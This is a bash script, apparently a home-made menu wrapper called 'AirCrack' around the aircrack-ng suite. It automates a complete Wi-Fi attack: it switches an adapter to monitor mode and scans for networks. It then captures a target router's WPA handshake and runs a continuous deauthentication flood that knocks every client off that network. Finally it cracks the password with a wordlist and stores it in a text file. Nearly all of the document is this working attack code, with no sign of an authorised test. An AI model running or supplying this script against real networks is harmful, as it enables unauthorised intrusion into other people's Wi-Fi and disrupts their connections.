   clear
    echo "====================================================="
  echo "          AirCrack is starting..."
  echo "====================================================="
  sudo chmod -R 777 hack 
  clear
  if [ -d hack ]; then
    echo "====================================================="
  echo "    Old files found, Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXX----------------------------------------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "    Old files found, Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXX----------------------------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "    Old files found, Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX--------------------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "    Old files found, Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX-----------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "    Old files found, Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]"
  sleep 1s
 clear
    echo "====================================================="
  echo "    Old files found, Clearing old useless files"
  echo "====================================================="
     rm -r hack &&  echo "All useless files has been deleted successfully."
  fi
  echo "Opening a freash workspace for new task..."
  echo " "
  sleep 2s
  clear
echo "SELECT YOUR OPTION";
echo "1. START MONITOR MODE"
echo "2. SCAN"
echo "3. CATCH"
echo "4. DISCONNECT CLIENT"
echo "5. READ"
echo "6. EXPORT"
echo "7. STOP MONITOR MODE"
echo "8. CRACK PASSWORD"
echo "9. CLEAR FAILED FILES"
echo -n "Enter your menu choice [1-9]: "

while :
do

# reading choice
read choice

case $choice in
# Pattern 1
  1)  clear && echo "                      Here are the available adapters..." && echo "=========================================================================" && mkdir -p hack/ && sudo airmon-ng && echo " " &&  echo "                      Which adapter you want to work with?" && echo "=========================================================================" && while [ -z $lan ]
do
   read -p "Adapter Name : " lan  
done && clear && touch hack/lan && echo $lan > hack/lan && sudo airmon-ng check kill &&  sudo airmon-ng start $lan && clear && echo "                          Switching "$lan" into monitor mode."  && echo "==================================================================================" && iwconfig && echo "==================================================================================" && echo " ";; 
  # Pattern 2
  2)   clear && echo "                      Here are the available adapters..." && echo "=================================================================================="
  iwconfig  && echo " "
   echo " " &&  echo "Enter the updated name of the adapter which is in MONITOR MODE and start scanning" && echo "==================================================================================" &&  read -p  "Adapter Name : "  lan  && while [ -z $lan ]
do
 read -p  "Enter a valid adapter Name : "  lan 
 done && mkdir -p hack/ && touch hack/lan && echo $lan > hack/lan && clear && echo "Scan is starting in 5 Sec " && sleep 1s && clear && echo "Scan is starting in 4 Sec ." && sleep 1s && clear && echo "Scan is starting in 3 Sec . ." && sleep 1s && clear && echo "Scan is starting in 2 Sec . . ." && sleep 1s && clear && echo "Scan is starting in 1 Sec . . . ." && sleep 1s && clear &&sudo airodump-ng $lan;;
  # Pattern 3
  3)   
echo " " 
echo "       You have already captured handshake file for following SSID :"
  echo "========================================================================="
  ls captured
  echo "========================================================================="
echo " " 
  echo " "
  echo "             Enter details of the target Router from above :"
  echo "=========================================================================" 
   read -p "SSID : " ssid
read -p "BSSID : " bssid
read -p "CHANNEL : " channel
rm -rf hack/$ssid
mkdir -p hack/$ssid
touch hack/ssid
echo $ssid > hack/ssid
touch hack/bssid
echo $bssid > hack/bssid
touch hack/channel
echo $channel > hack/channel
lan="`head -1 hack/lan`"
title="______________Trting to get the Handshake file.________________"
undr="==============================================================="
x-terminal-emulator -e "sh -c 'sudo -u root whoami && clear && echo $title && echo $undr &&  sudo airodump-ng -w hack/$ssid/hack1 -c $channel --bssid $bssid $lan; $SHELL'" & sleep 2s &&  sudo chmod -R 777 hack && clear;;
  # Pattern 4
  4)    bssid="`head -1 hack/bssid`"
lan="`head -1 hack/lan`"
clear
sudo -u root whoami
clear
if [ -z $lan ];
then
clear
 echo "============================================================================="  
echo "                   No WiFi adapter is selected. Try Step 1 first."
 echo "============================================================================="  
 echo " "
  echo " "
else 
if [ -z $bssid ];
then
clear
echo "============================================================================="  
echo "                    No BSSID is selected. Try Step 2 first."
 echo "============================================================================="  
  echo " "
   echo " "
else 
  echo "         Disconnecting clients which are connected to BSSID : "$bssid
  echo "============================================================================="  
sudo aireplay-ng --deauth 0 -a $bssid $lan
fi
fi;;
  # Pattern 5
  5)  if [ -d hack/$bssid ];
then
  ssid="`head -1 hack/ssid`"
  clear && echo "Opening wireshark in 3 Sec" && sleep 1s && clear && echo "Opening wireshark in 2 Sec ." && sleep 1s && clear && echo "Opening wireshark in 1 Sec . ." && sleep 1s && clear 
wireshark hack/$ssid/hack1-01.cap
clear
read  -p  "EAPOL file found? (Y/N)  : " ans
while :
do
case $ans in
Y)
touch hack/found && echo $ssid > hack/found
ans=""
break;;
y)
touch hack/found && echo $ssid > hack/found
ans=""
break;;
N) ans=""
  sudo chmod -R 777 hack
  rm hack/found
break;;
n) ans=""
  sudo chmod -R 777 hack
  rm hack/found
break;;
*) ans=""
esac
read  -p  "EAPOL file found? (Y/N) : " ans
done
else
clear
echo "============================================================================="  
echo "                  No handshake file found. Try Step 3 first."
 echo "============================================================================="  
  echo " "
   echo " "
   fi;;   
# Pattern 6
  6)   if [ -d hack/$bssid ];
then
  if [ -f hack/found ];
  then
  ssid="`head -1 hack/ssid`"
  clear && echo "Exporting captured file for SSID : "$ssid" in 3 Sec" && sleep 1s && clear && echo "Exporting captured file for SSID : "$ssid" in 2 Sec ." && sleep 1s && clear && echo "Exporting captured file for SSID : "$ssid" in 1 Sec . ." && sleep 1s && clear 
  mkdir -p captured
sudo chmod -r 777 hack
mv hack/$ssid/ captured/$ssid/ 
rm hack/bssid
rm hack/ssid
rm hack/channel
rm hack/found
clear
  echo "========================================================================================"  
echo "          Captured files for SSID : "$ssid" successfully exported in captured/"$ssid"/ folder."
  echo "========================================================================================"
  else
  clear
  echo "============================================================================="  
echo "           No handshake is verified as captured. Try Step 3 first."
 echo "============================================================================="  
  echo " "
   echo " "
  fi
  else
clear
   echo " "
echo "============================================================================="  
echo "            No handshake file found to export. Try Step 3 first."
 echo "============================================================================="  
  echo " "
   echo " "
   fi;;  
# Pattern 7
  7) 
  if [ -f hack/$lan ];
then
  lan="`head -1 hack/lan`"
  sudo chmod 777 hack/lan
  rm hack/lan
  clear && echo "Closing monitor mode for adapter "$lan" in 3 Sec ." && sleep 1s && clear && echo "Closing monitor mode for adapter "$lan" in 2 Sec . ." && sleep 1s && clear && echo "Closing monitor mode for adapter "$lan" in 1 Sec . . ." && sleep 1s && clear &&
rm -r hack && clear && sudo airmon-ng stop $lan
clear && echo "===============================================================================" && echo "                    Turning off MONITOR MODE for adapter : "$lan && echo "================================================================================" && echo "Wait......." && sleep 1s && clear && echo "===============================================================================" && echo "                    Turning off MONITOR MODE for adapter : "$lan && echo "================================================================================" &&  echo "Wait.............. " && sleep 1s && clear && echo "===============================================================================" && echo "                    Turning off MONITOR MODE for adapter : "$lan && echo "================================================================================" && echo "Wait..................... " && sleep 1s && clear && echo "===============================================================================" && echo "                    Turning off MONITOR MODE for adapter : "$lan && echo "================================================================================" && echo "MONITOR MODE for adapter "$lan" has been turned off successfully."  
echo " "
echo " "
else
clear
echo "==============================================================================="
echo "                         Adapter is not in MONITOR MODE" 
echo "==============================================================================="
echo ""
fi;;
# Pattern 8
  8)  clear
    echo "====================================================="
  echo "          Cracking Password using Aircrack"
  echo "====================================================="
  echo " "
echo " "
echo "Select one SSID from below :"
  echo "====================================================="
  ls captured
  echo "====================================================="
echo " "  
read -p "SSID : " ssid
echo " "
echo " "
  echo "Select one WORDLIST from below :"
  echo "====================================================="
  ls wordlist/
  echo "====================================================="
echo " "
read -p "Word List Name : " list
 clear
    echo "====================================================="
  echo "          Cracking Password using Aircrack"
  echo "====================================================="
  echo "Password for "$ssid" using word list "$list
  echo "by AirCrack will start in 5 sec ."
  sleep 1s
  clear
    echo "====================================================="
  echo "          Cracking Password using Aircrack"
  echo "====================================================="
  echo "Password for "$ssid" using word list "$list
  echo "by AirCrack will start in 4 sec . ."
  sleep 1s
  clear
    echo "====================================================="
  echo "          Cracking Password using Aircrack"
  echo "====================================================="
  echo "Password for "$ssid" using word list "$list
  echo "by AirCrack will start in 3 sec . . ."
  sleep 1s
  clear
    echo "====================================================="
  echo "          Cracking Password using Aircrack"
  echo "====================================================="
  echo "Password for "$ssid" using word list "$list
  echo "by AirCrack will start in 2 sec . . . ."
  sleep 1s
  clear
    echo "====================================================="
  echo "          Cracking Password using Aircrack"
  echo "====================================================="
  echo "Password for "$ssid" using word list "$list
  echo "by AirCrack will start in 1 sec . . . . ."
  sleep 1s 
  clear
aircrack-ng captured/$ssid/hack1-01.cap -w wordlist/$list
read -p "Password : " pass
touch captured/$ssid/password.txt
echo "SSID is : " $ssid" and PASSWORD is : " $pass >> captured/$ssid/password.txt;;
# Pattern 9
  9)  clear
    echo "====================================================="
  echo "          Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXX----------------------------------------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "          Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXX----------------------------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "          Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX--------------------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "          Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX-----------]"
  sleep 1s
 clear
    echo "====================================================="
  echo "          Clearing old useless files"
  echo "====================================================="
  echo "Clearing old useless files"
  echo "[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]"
  sleep 1s
 clear
    echo "====================================================="
  echo "          Clearing old useless files"
  echo "====================================================="
  echo "All useless files has been deleted successfully."
  echo " "
  echo " "
  rm -r hack;;
  # Default Pattern
  *) clear
  echo "invalid option"
  echo "";;
  
esac
echo "SELECT YOUR OPTION";
echo "1. START MONITOR MODE"
echo "2. SCAN"
echo "3. CATCH"
echo "4. DISCONNECT CLIENT"
echo "5. READ"
echo "6. EXPORT"
echo "7. STOP MONITOR MODE"
echo "8. CRACK PASSWORD"
echo "9. CLEAR FAILED FILES"
echo -n "Enter your menu choice [1-9]: "
done
